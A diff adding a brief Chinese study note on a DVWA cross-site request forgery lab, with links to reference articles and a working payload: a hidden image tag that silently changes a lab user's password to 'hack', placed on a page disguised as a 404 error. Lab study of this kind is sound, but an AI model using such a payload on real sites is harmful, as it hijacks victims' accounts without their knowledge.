@@ -1,0 +1,14 @@
+###DVWA CSRF实战演练#######
+###学习地址####
+http://www.freebuf.com/articles/web/118352.html
+
+原理：主要是cookie的利用
+http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html
+
+
+
+###重要的是伪造攻击后的结果
+###代码如下
+<img src="http://192.168.153.130/passswd.php?password_new=hack&password_conf=hack&Change=Change#" border="0" style="display:none;"/>
+<h1>404<h1>
+<h2>file not found.<h2>
